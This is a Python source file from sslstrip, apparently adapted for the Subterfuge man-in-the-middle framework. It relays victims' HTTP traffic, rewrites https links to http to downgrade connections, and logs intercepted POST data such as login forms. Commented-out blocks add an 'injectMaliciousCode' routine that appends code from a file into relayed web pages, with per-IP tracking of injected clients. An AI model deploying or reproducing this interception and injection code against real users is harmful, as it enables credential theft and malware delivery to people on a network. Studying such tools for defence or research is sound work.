# Copyright (c) 2004-2009 Moxie Marlinspike
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import logging, re, string, random, zlib, gzip, StringIO, os

import sys
import time
sys.path.append(os.path.dirname(os.path.dirname(os.path.dirname(__file__))))
import threading
  #Ignore Deprication Warnings
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning) 

#Subterfuge Database Models

print os.getpid()

from twisted.web.http import HTTPClient
from URLMonitor import URLMonitor

class ServerConnection(HTTPClient):

    ''' The server connection is where we do the bulk of the stripping.  Everything that
    comes back is examined.  The headers we dont like are removed, and the links are stripped
    from HTTPS to HTTP.
    '''

    urlExpression     = re.compile(r"(https://[\w\d:#@%/;$()~_?\+-=\\\.&]*)", re.IGNORECASE)
    urlType           = re.compile(r"https://", re.IGNORECASE)
    urlExplicitPort   = re.compile(r'https://([a-zA-Z0-9.]+):[0-9]+/',  re.IGNORECASE)

    def __init__(self, command, uri, postData, headers, client):
        self.command          = command
        self.uri              = uri
        self.postData         = postData
        self.headers          = headers
        self.client           = client
        self.urlMonitor       = URLMonitor.getInstance()
        self.isImageRequest   = False
        self.isCompressed     = False
        self.contentLength    = None
        self.shutdownComplete = False
        
    #############################################
    '''
               #0sm0s1z
            #Check if Injection Status
        module = installed.objects.get(name = "httpcodeinjection")

            #Determine if injection is true
        self.injection = module.active
        #print "using sslstrip"

	   #Injection Manager (uses settins to determine injection rate)
    def injectManager(self, clientip):
        settings = setup.objects.get(id = "1")
		   #Set Injection Bit
        print "Injection Sent to: " + clientip
        print "Pausing Injection for " + settings.injectrate + " secs..."
        iptrack.objects.filter(address = clientip).update(injected = "1")

		   #Reset inject	
        time.sleep(int(settings.injectrate))
        print "Resuming Injection"
        iptrack.objects.filter(address = clientip).update(injected = "0")



        #Added by 0sm0s1z to allow for injection of malicious code into the relayed webpage
    def injectMaliciousCode(self, data, clientip):   
            #Determine what code is to be injected
        codedir = str(os.path.dirname(__file__)).rstrip("abcdefghijklmnnnopqrstruvwxyz") + "modules/httpcodeinjection/inject.x"
        f = open(codedir, 'r')
        inject = f.readlines()
        
        
            #Modify Data with code injection
        #data += str(inject)
        for j in inject:
           data += str(j)
        #print data
        return data
    '''
    ############################################


    def getLogLevel(self):
        return logging.DEBUG

    def getPostPrefix(self):
        return "POST"

    def sendRequest(self):
        logging.log(self.getLogLevel(), "Sending Request: %s %s"  % (self.command, self.uri))
        self.sendCommand(self.command, self.uri)

    def sendHeaders(self):
        for header, value in self.headers.items():
            logging.log(self.getLogLevel(), "Sending header: %s : %s" % (header, value))
            self.sendHeader(header, value)

        self.endHeaders()

      #r00t0v3r1d3
    def sendPostData(self):
        logging.warning(self.getPostPrefix() + " Data (" + self.headers['host'] + "):" + str(self.postData))
        self.transport.write(self.postData)

    def connectionMade(self):
        logging.log(self.getLogLevel(), "HTTP connection made.")
        self.sendRequest()
        self.sendHeaders()
        
        if (self.command == 'POST'):
            self.sendPostData()

    def handleStatus(self, version, code, message):
        logging.log(self.getLogLevel(), "Got server response: %s %s %s" % (version, code, message))
        self.client.setResponseCode(int(code), message)

    def handleHeader(self, key, value):
        logging.log(self.getLogLevel(), "Got server header: %s:%s" % (key, value))

        if (key.lower() == 'location'):
            value = self.replaceSecureLinks(value)

        if (key.lower() == 'content-type'):
            if (value.find('image') != -1):
                self.isImageRequest = True
                logging.debug("Response is image content, not scanning...")

        if (key.lower() == 'content-encoding'):
            if (value.find('gzip') != -1):
                logging.debug("Response is compressed...")
                self.isCompressed = True
        elif (key.lower() == 'content-length'):
            self.contentLength = value
        elif (key.lower() == 'set-cookie'):
            self.client.responseHeaders.addRawHeader(key, value)
        else:
            self.client.setHeader(key, value)

    def handleEndHeaders(self):
       if (self.isImageRequest and self.contentLength != None):
           self.client.setHeader("Content-Length", self.contentLength)

       if self.length == 0:
           self.shutdown()
                        
    def handleResponsePart(self, data):
        if (self.isImageRequest):
            self.client.write(data)
        else:
            HTTPClient.handleResponsePart(self, data)

    def handleResponseEnd(self):
        if (self.isImageRequest):
            self.shutdown()
        else:
	    try:
                HTTPClient.handleResponseEnd(self)
	    except:
		pass

    def handleResponse(self, data):
        if (self.isCompressed):
            logging.debug("Decompressing content...")
            data = gzip.GzipFile('', 'rb', 9, StringIO.StringIO(data)).read()
           
        #print data           
        '''
        ####################################    
            #Data manipulation determination
            #0sm0s1z
            
        with open(str(os.path.dirname(os.path.abspath(__file__))) + '/clientip', 'r') as file:
            clientip = file.readlines()    
            
        iptrack.objects.filter(id = "1").update(address = clientip[0])    
        
            #Check for Existing IP Address
        try:
           check = iptrack.objects.exclude(id = "1").get(address = clientip[0])

               #Check for uninjected IP Address   
           if check.injected == "0":
              if len(self.injection) > 2: 
                  data = self.injectMaliciousCode(data, clientip[0])
                    
        except:
            newip = iptrack(address = clientip[0], injected = "0")
            newip.save()
            print "New Client Detected! %s" % clientip[0]
            if len(self.injection) > 2: 
               data = self.injectMaliciousCode(data, clientip[0])            
               #print data     
                
        '''
        ####################################       
            
        logging.log(self.getLogLevel(), "Read from server:\n" + data)

        data = self.replaceSecureLinks(data)

        if (self.contentLength != None):
            self.client.setHeader('Content-Length', len(data))
        
	try:
        	self.client.write(data)
	except:
		pass
	try:
            self.shutdown()
	except:
	    pass

    def replaceSecureLinks(self, data):
        iterator = re.finditer(ServerConnection.urlExpression, data)

        for match in iterator:
            url = match.group()

            logging.debug("Found secure reference: " + url)

            url = url.replace('https://', 'http://', 1)
            url = url.replace('&amp;', '&')
            self.urlMonitor.addSecureLink(self.client.getClientIP(), url)

        data = re.sub(ServerConnection.urlExplicitPort, r'http://\1/', data)
        return re.sub(ServerConnection.urlType, 'http://', data)

    def shutdown(self):
        if not self.shutdownComplete:
            self.shutdownComplete = True
	    try:
                self.client.finish()
	    except:
		pass
            self.transport.loseConnection()
